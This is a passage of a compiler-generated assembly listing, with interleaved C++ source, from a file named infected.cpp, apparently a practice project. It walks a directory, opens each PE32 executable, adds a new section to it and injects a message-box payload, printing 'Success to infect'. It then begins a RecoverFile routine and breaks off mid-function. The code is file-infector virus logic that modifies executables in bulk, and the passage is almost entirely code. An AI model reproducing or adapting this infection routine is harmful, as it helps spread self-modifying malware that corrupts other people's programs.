  0017e	e8 00 00 00 00	 call	 ?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
  00183	89 85 70 ff ff
	ff		 mov	 DWORD PTR _filePath$3[ebp], eax

; 482  :             OpenFile(filePath);

  00189	8b 85 70 ff ff
	ff		 mov	 eax, DWORD PTR _filePath$3[ebp]
  0018f	50		 push	 eax
  00190	e8 00 00 00 00	 call	 ?OpenFile@@YA_NPBD@Z	; OpenFile
  00195	83 c4 04	 add	 esp, 4

; 483  :         }

  00198	8d 4d b4	 lea	 ecx, DWORD PTR _temp$10[ebp]
  0019b	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
$LN5@OpenDirect:

; 484  :         countFile++;

  001a0	8b 4d 8c	 mov	 ecx, DWORD PTR _countFile$[ebp]
  001a3	83 c1 01	 add	 ecx, 1
  001a6	89 4d 8c	 mov	 DWORD PTR _countFile$[ebp], ecx
  001a9	e9 dd fe ff ff	 jmp	 $LN2@OpenDirect
$LN3@OpenDirect:

; 485  :     }

  001ae	8d 8d 68 ff ff
	ff		 lea	 ecx, DWORD PTR _<end>$L0$2[ebp]
  001b4	e8 00 00 00 00	 call	 ??1directory_iterator@filesystem@std@@QAE@XZ ; std::filesystem::directory_iterator::~directory_iterator
  001b9	8d 8d 7c ff ff
	ff		 lea	 ecx, DWORD PTR _<begin>$L0$4[ebp]
  001bf	e8 00 00 00 00	 call	 ??1directory_iterator@filesystem@std@@QAE@XZ ; std::filesystem::directory_iterator::~directory_iterator
  001c4	8d 8d 60 ff ff
	ff		 lea	 ecx, DWORD PTR _$S4$1[ebp]
  001ca	e8 00 00 00 00	 call	 ??1directory_iterator@filesystem@std@@QAE@XZ ; std::filesystem::directory_iterator::~directory_iterator

; 486  : 
; 487  :     if (countFile == 0)

  001cf	83 7d 8c 00	 cmp	 DWORD PTR _countFile$[ebp], 0
  001d3	75 04		 jne	 SHORT $LN6@OpenDirect

; 488  :     {
; 489  :         return false;

  001d5	32 c0		 xor	 al, al
  001d7	eb 02		 jmp	 SHORT $LN1@OpenDirect
$LN6@OpenDirect:

; 490  :     }
; 491  : 
; 492  :     return true;

  001d9	b0 01		 mov	 al, 1
$LN1@OpenDirect:

; 493  : }

  001db	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  001de	33 cd		 xor	 ecx, ebp
  001e0	e8 00 00 00 00	 call	 @__security_check_cookie@4
  001e5	8b e5		 mov	 esp, ebp
  001e7	5d		 pop	 ebp
  001e8	c3		 ret	 0
?OpenDirectory@@YA_NPBD@Z ENDP				; OpenDirectory
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
tv230 = -60						; size = 4
tv220 = -56						; size = 4
tv202 = -52						; size = 4
tv183 = -48						; size = 4
tv163 = -44						; size = 4
tv152 = -40						; size = 4
$T1 = -36						; size = 4
tv130 = -32						; size = 4
tv80 = -28						; size = 4
_byteWritten$ = -24					; size = 4
_pDosHeader$ = -20					; size = 4
_pNtHeader$ = -16					; size = 4
_pByte$ = -12						; size = 4
_fileSize$ = -8						; size = 4
_hFile$ = -4						; size = 4
_fileName$ = 8						; size = 4
?OpenFile@@YA_NPBD@Z PROC				; OpenFile

; 411  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 3c	 sub	 esp, 60			; 0000003cH

; 412  :     // Open file and get information
; 413  :     HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  00006	6a 00		 push	 0
  00008	68 80 00 00 00	 push	 128			; 00000080H
  0000d	6a 03		 push	 3
  0000f	6a 00		 push	 0
  00011	6a 00		 push	 0
  00013	68 00 00 00 c0	 push	 -1073741824		; c0000000H
  00018	8b 45 08	 mov	 eax, DWORD PTR _fileName$[ebp]
  0001b	50		 push	 eax
  0001c	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CreateFileA@28
  00022	89 45 fc	 mov	 DWORD PTR _hFile$[ebp], eax

; 414  :     if (hFile == INVALID_HANDLE_VALUE)

  00025	83 7d fc ff	 cmp	 DWORD PTR _hFile$[ebp], -1
  00029	75 29		 jne	 SHORT $LN2@OpenFile

; 415  :     {
; 416  :         cerr << "Error: Invalid file, try another one" << endl;

  0002b	68 00 00 00 00	 push	 OFFSET $SG147946
  00030	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  00035	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0003a	83 c4 08	 add	 esp, 8
  0003d	89 45 e4	 mov	 DWORD PTR tv80[ebp], eax
  00040	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00045	8b 4d e4	 mov	 ecx, DWORD PTR tv80[ebp]
  00048	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 417  :         return false;

  0004d	32 c0		 xor	 al, al
  0004f	e9 62 02 00 00	 jmp	 $LN1@OpenFile
$LN2@OpenFile:

; 418  :     }
; 419  : 
; 420  :     DWORD fileSize = GetFileSize(hFile, NULL);

  00054	6a 00		 push	 0
  00056	8b 4d fc	 mov	 ecx, DWORD PTR _hFile$[ebp]
  00059	51		 push	 ecx
  0005a	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__GetFileSize@8
  00060	89 45 f8	 mov	 DWORD PTR _fileSize$[ebp], eax

; 421  :     if (!fileSize)

  00063	83 7d f8 00	 cmp	 DWORD PTR _fileSize$[ebp], 0
  00067	75 4e		 jne	 SHORT $LN3@OpenFile

; 422  :     {
; 423  :         CloseHandle(hFile);

  00069	8b 55 fc	 mov	 edx, DWORD PTR _hFile$[ebp]
  0006c	52		 push	 edx
  0006d	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 424  :         cerr << "Error: File " << fileName << " empty, try another one" << endl;

  00073	68 00 00 00 00	 push	 OFFSET $SG147949
  00078	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  0007d	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00082	83 c4 08	 add	 esp, 8
  00085	8b 4d 08	 mov	 ecx, DWORD PTR _fileName$[ebp]
  00088	51		 push	 ecx
  00089	50		 push	 eax
  0008a	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0008f	83 c4 08	 add	 esp, 8
  00092	68 00 00 00 00	 push	 OFFSET $SG147948
  00097	50		 push	 eax
  00098	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0009d	83 c4 08	 add	 esp, 8
  000a0	89 45 e0	 mov	 DWORD PTR tv130[ebp], eax
  000a3	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  000a8	8b 4d e0	 mov	 ecx, DWORD PTR tv130[ebp]
  000ab	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 425  :         return false;

  000b0	32 c0		 xor	 al, al
  000b2	e9 ff 01 00 00	 jmp	 $LN1@OpenFile
$LN3@OpenFile:

; 426  :     }
; 427  : 
; 428  :     // Buffer to allocate
; 429  :     BYTE *pByte = new BYTE[fileSize];

  000b7	8b 55 f8	 mov	 edx, DWORD PTR _fileSize$[ebp]
  000ba	52		 push	 edx
  000bb	e8 00 00 00 00	 call	 ??_U@YAPAXI@Z		; operator new[]
  000c0	83 c4 04	 add	 esp, 4
  000c3	89 45 dc	 mov	 DWORD PTR $T1[ebp], eax
  000c6	8b 45 dc	 mov	 eax, DWORD PTR $T1[ebp]
  000c9	89 45 f4	 mov	 DWORD PTR _pByte$[ebp], eax

; 430  :     DWORD byteWritten;
; 431  : 
; 432  :     // Reading the entire file to use the PE information
; 433  :     if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL))

  000cc	6a 00		 push	 0
  000ce	8d 4d e8	 lea	 ecx, DWORD PTR _byteWritten$[ebp]
  000d1	51		 push	 ecx
  000d2	8b 55 f8	 mov	 edx, DWORD PTR _fileSize$[ebp]
  000d5	52		 push	 edx
  000d6	8b 45 f4	 mov	 eax, DWORD PTR _pByte$[ebp]
  000d9	50		 push	 eax
  000da	8b 4d fc	 mov	 ecx, DWORD PTR _hFile$[ebp]
  000dd	51		 push	 ecx
  000de	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__ReadFile@20
  000e4	85 c0		 test	 eax, eax
  000e6	75 2f		 jne	 SHORT $LN4@OpenFile

; 434  :     {
; 435  :         cerr << "Error: Fail to read file " << fileName << endl;

  000e8	68 00 00 00 00	 push	 OFFSET $SG147951
  000ed	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  000f2	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  000f7	83 c4 08	 add	 esp, 8
  000fa	8b 55 08	 mov	 edx, DWORD PTR _fileName$[ebp]
  000fd	52		 push	 edx
  000fe	50		 push	 eax
  000ff	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00104	83 c4 08	 add	 esp, 8
  00107	89 45 d8	 mov	 DWORD PTR tv152[ebp], eax
  0010a	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0010f	8b 4d d8	 mov	 ecx, DWORD PTR tv152[ebp]
  00112	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
$LN4@OpenFile:

; 436  :     }
; 437  : 
; 438  :     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;

  00117	8b 45 f4	 mov	 eax, DWORD PTR _pByte$[ebp]
  0011a	89 45 ec	 mov	 DWORD PTR _pDosHeader$[ebp], eax

; 439  :     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)

  0011d	8b 4d ec	 mov	 ecx, DWORD PTR _pDosHeader$[ebp]
  00120	0f b7 11	 movzx	 edx, WORD PTR [ecx]
  00123	81 fa 4d 5a 00
	00		 cmp	 edx, 23117		; 00005a4dH
  00129	74 33		 je	 SHORT $LN5@OpenFile

; 440  :     {
; 441  :         CloseHandle(hFile);

  0012b	8b 45 fc	 mov	 eax, DWORD PTR _hFile$[ebp]
  0012e	50		 push	 eax
  0012f	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 442  :         cerr << "Error: Invalid path or PE format" << endl;

  00135	68 00 00 00 00	 push	 OFFSET $SG147953
  0013a	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  0013f	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00144	83 c4 08	 add	 esp, 8
  00147	89 45 d4	 mov	 DWORD PTR tv163[ebp], eax
  0014a	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0014f	8b 4d d4	 mov	 ecx, DWORD PTR tv163[ebp]
  00152	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 443  :         return false;

  00157	32 c0		 xor	 al, al
  00159	e9 58 01 00 00	 jmp	 $LN1@OpenFile
$LN5@OpenFile:

; 444  :     }
; 445  : 
; 446  :     PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);

  0015e	8b 4d ec	 mov	 ecx, DWORD PTR _pDosHeader$[ebp]
  00161	8b 55 f4	 mov	 edx, DWORD PTR _pByte$[ebp]
  00164	03 51 3c	 add	 edx, DWORD PTR [ecx+60]
  00167	89 55 f0	 mov	 DWORD PTR _pNtHeader$[ebp], edx

; 447  :     if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)

  0016a	8b 45 f0	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  0016d	0f b7 48 04	 movzx	 ecx, WORD PTR [eax+4]
  00171	81 f9 4c 01 00
	00		 cmp	 ecx, 332		; 0000014cH
  00177	74 4e		 je	 SHORT $LN6@OpenFile

; 448  :     {
; 449  :         CloseHandle(hFile);

  00179	8b 55 fc	 mov	 edx, DWORD PTR _hFile$[ebp]
  0017c	52		 push	 edx
  0017d	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 450  :         cerr << "Error: " << fileName << " is PE32+, this version works only with PE32" << endl;

  00183	68 00 00 00 00	 push	 OFFSET $SG147956
  00188	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  0018d	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00192	83 c4 08	 add	 esp, 8
  00195	8b 4d 08	 mov	 ecx, DWORD PTR _fileName$[ebp]
  00198	51		 push	 ecx
  00199	50		 push	 eax
  0019a	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0019f	83 c4 08	 add	 esp, 8
  001a2	68 00 00 00 00	 push	 OFFSET $SG147955
  001a7	50		 push	 eax
  001a8	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  001ad	83 c4 08	 add	 esp, 8
  001b0	89 45 d0	 mov	 DWORD PTR tv183[ebp], eax
  001b3	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  001b8	8b 4d d0	 mov	 ecx, DWORD PTR tv183[ebp]
  001bb	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 451  :         return false;

  001c0	32 c0		 xor	 al, al
  001c2	e9 ef 00 00 00	 jmp	 $LN1@OpenFile
$LN6@OpenFile:

; 452  :     }
; 453  : 
; 454  :     if (!CreateNewSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400))

  001c7	68 90 01 00 00	 push	 400			; 00000190H
  001cc	8d 55 e8	 lea	 edx, DWORD PTR _byteWritten$[ebp]
  001cf	52		 push	 edx
  001d0	8d 45 f8	 lea	 eax, DWORD PTR _fileSize$[ebp]
  001d3	50		 push	 eax
  001d4	8b 4d f4	 mov	 ecx, DWORD PTR _pByte$[ebp]
  001d7	51		 push	 ecx
  001d8	8d 55 f0	 lea	 edx, DWORD PTR _pNtHeader$[ebp]
  001db	52		 push	 edx
  001dc	8d 45 fc	 lea	 eax, DWORD PTR _hFile$[ebp]
  001df	50		 push	 eax
  001e0	e8 00 00 00 00	 call	 ?CreateNewSection@@YA_NAAPAXAAPAU_IMAGE_NT_HEADERS@@PAEAAK3K@Z ; CreateNewSection
  001e5	83 c4 18	 add	 esp, 24			; 00000018H
  001e8	0f b6 c8	 movzx	 ecx, al
  001eb	85 c9		 test	 ecx, ecx
  001ed	75 36		 jne	 SHORT $LN7@OpenFile

; 455  :     {
; 456  :         cerr << "Error: Fail to create new section into " << fileName << endl;

  001ef	68 00 00 00 00	 push	 OFFSET $SG147958
  001f4	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  001f9	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  001fe	83 c4 08	 add	 esp, 8
  00201	8b 55 08	 mov	 edx, DWORD PTR _fileName$[ebp]
  00204	52		 push	 edx
  00205	50		 push	 eax
  00206	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0020b	83 c4 08	 add	 esp, 8
  0020e	89 45 cc	 mov	 DWORD PTR tv202[ebp], eax
  00211	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00216	8b 4d cc	 mov	 ecx, DWORD PTR tv202[ebp]
  00219	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 457  :         return false;

  0021e	32 c0		 xor	 al, al
  00220	e9 91 00 00 00	 jmp	 $LN1@OpenFile
$LN7@OpenFile:

; 458  :     }
; 459  : 
; 460  :     // Insert data into the last section
; 461  :     if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten))

  00225	8b 45 e8	 mov	 eax, DWORD PTR _byteWritten$[ebp]
  00228	50		 push	 eax
  00229	8b 4d f8	 mov	 ecx, DWORD PTR _fileSize$[ebp]
  0022c	51		 push	 ecx
  0022d	8b 55 f4	 mov	 edx, DWORD PTR _pByte$[ebp]
  00230	52		 push	 edx
  00231	8b 45 f0	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00234	50		 push	 eax
  00235	8d 4d fc	 lea	 ecx, DWORD PTR _hFile$[ebp]
  00238	51		 push	 ecx
  00239	e8 00 00 00 00	 call	 ?InflectSection@@YA_NAAPAXPAU_IMAGE_NT_HEADERS@@PAEKK@Z ; InflectSection
  0023e	83 c4 14	 add	 esp, 20			; 00000014H
  00241	0f b6 d0	 movzx	 edx, al
  00244	85 d2		 test	 edx, edx
  00246	75 33		 jne	 SHORT $LN8@OpenFile

; 462  :     {
; 463  :         cerr << "Error: Fail to infect Message Box into " << fileName << endl;

  00248	68 00 00 00 00	 push	 OFFSET $SG147960
  0024d	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  00252	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00257	83 c4 08	 add	 esp, 8
  0025a	8b 4d 08	 mov	 ecx, DWORD PTR _fileName$[ebp]
  0025d	51		 push	 ecx
  0025e	50		 push	 eax
  0025f	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00264	83 c4 08	 add	 esp, 8
  00267	89 45 c8	 mov	 DWORD PTR tv220[ebp], eax
  0026a	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0026f	8b 4d c8	 mov	 ecx, DWORD PTR tv220[ebp]
  00272	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 464  :         return false;

  00277	32 c0		 xor	 al, al
  00279	eb 3b		 jmp	 SHORT $LN1@OpenFile
$LN8@OpenFile:

; 465  :     }
; 466  : 
; 467  :     cerr << "Success to infect Message Box into " << fileName << endl;

  0027b	68 00 00 00 00	 push	 OFFSET $SG147961
  00280	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  00285	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0028a	83 c4 08	 add	 esp, 8
  0028d	8b 55 08	 mov	 edx, DWORD PTR _fileName$[ebp]
  00290	52		 push	 edx
  00291	50		 push	 eax
  00292	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00297	83 c4 08	 add	 esp, 8
  0029a	89 45 c4	 mov	 DWORD PTR tv230[ebp], eax
  0029d	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  002a2	8b 4d c4	 mov	 ecx, DWORD PTR tv230[ebp]
  002a5	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 468  : 
; 469  :     CloseHandle(hFile);

  002aa	8b 45 fc	 mov	 eax, DWORD PTR _hFile$[ebp]
  002ad	50		 push	 eax
  002ae	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 470  :     return true;

  002b4	b0 01		 mov	 al, 1
$LN1@OpenFile:

; 471  : }

  002b6	8b e5		 mov	 esp, ebp
  002b8	5d		 pop	 ebp
  002b9	c3		 ret	 0
?OpenFile@@YA_NPBD@Z ENDP				; OpenFile
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
_lastSection$ = -80					; size = 4
tv285 = -76						; size = 4
_entryPoint$ = -72					; size = 4
tv191 = -68						; size = 4
tv180 = -64						; size = 4
tv170 = -60						; size = 4
tv157 = -56						; size = 4
tv141 = -52						; size = 4
tv95 = -48						; size = 4
tv80 = -44						; size = 4
_lpBase$ = -40						; size = 4
_pDosHeader$ = -36					; size = 4
_hMap$ = -32						; size = 4
_byteWritten$ = -28					; size = 4
_section$ = -24						; size = 4
_fileSize$ = -20					; size = 4
_pByte$ = -16						; size = 4
_i$1 = -12						; size = 4
_hFile$ = -8						; size = 4
_pNtHeader$ = -4					; size = 4
_fileName$ = 8						; size = 4
?RecoverFile@@YA_NPBD@Z PROC				; RecoverFile

; 320  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H

; 321  :     // Load file
; 322  :     HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  00006	6a 00		 push	 0
  00008	68 80 00 00 00	 push	 128			; 00000080H
  0000d	6a 03		 push	 3
  0000f	6a 00		 push	 0
  00011	6a 00		 push	 0
  00013	68 00 00 00 c0	 push	 -1073741824		; c0000000H
  00018	8b 45 08	 mov	 eax, DWORD PTR _fileName$[ebp]
  0001b	50		 push	 eax
  0001c	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CreateFileA@28
  00022	89 45 f8	 mov	 DWORD PTR _hFile$[ebp], eax

; 323  :     if (hFile == INVALID_HANDLE_VALUE)

  00025	83 7d f8 ff	 cmp	 DWORD PTR _hFile$[ebp], -1
  00029	75 29		 jne	 SHORT $LN5@RecoverFil

; 324  :     {
; 325  :         cerr << "Error: Fail to open file " << endl;

  0002b	68 00 00 00 00	 push	 OFFSET $SG147865
  00030	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  00035	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0003a	83 c4 08	 add	 esp, 8
  0003d	89 45 d4	 mov	 DWORD PTR tv80[ebp], eax
  00040	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00045	8b 4d d4	 mov	 ecx, DWORD PTR tv80[ebp]
  00048	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 326  :         return false;

  0004d	32 c0		 xor	 al, al
  0004f	e9 31 03 00 00	 jmp	 $LN1@RecoverFil
$LN5@RecoverFil:

; 327  :     }
; 328  : 
; 329  :     // Map file into memory
; 330  :     HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);

  00054	6a 00		 push	 0
  00056	6a 00		 push	 0
  00058	6a 00		 push	 0
  0005a	6a 04		 push	 4
  0005c	6a 00		 push	 0
  0005e	8b 4d f8	 mov	 ecx, DWORD PTR _hFile$[ebp]
  00061	51		 push	 ecx
  00062	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CreateFileMappingA@24
  00068	89 45 e0	 mov	 DWORD PTR _hMap$[ebp], eax

; 331  :     if (hMap == NULL)

  0006b	83 7d e0 00	 cmp	 DWORD PTR _hMap$[ebp], 0
  0006f	75 29		 jne	 SHORT $LN6@RecoverFil

; 332  :     {
; 333  :         cerr << "Error: Fail to map file into memory" << endl;

  00071	68 00 00 00 00	 push	 OFFSET $SG147867
  00076	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  0007b	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00080	83 c4 08	 add	 esp, 8
  00083	89 45 d0	 mov	 DWORD PTR tv95[ebp], eax
  00086	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0008b	8b 4d d0	 mov	 ecx, DWORD PTR tv95[ebp]
  0008e	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 334  :         return false;

  00093	32 c0		 xor	 al, al
  00095	e9 eb 02 00 00	 jmp	 $LN1@RecoverFil
$LN6@RecoverFil:

; 335  :     }
; 336  : 
; 337  :     LPVOID lpBase = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

  0009a	6a 00		 push	 0
  0009c	6a 00		 push	 0
  0009e	6a 00		 push	 0
  000a0	68 1f 00 0f 00	 push	 983071			; 000f001fH
  000a5	8b 55 e0	 mov	 edx, DWORD PTR _hMap$[ebp]
  000a8	52		 push	 edx
  000a9	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__MapViewOfFile@20
  000af	89 45 d8	 mov	 DWORD PTR _lpBase$[ebp], eax

; 338  :     if (lpBase == NULL)

  000b2	83 7d d8 00	 cmp	 DWORD PTR _lpBase$[ebp], 0
  000b6	75 29		 jne	 SHORT $LN7@RecoverFil

; 339  :     {
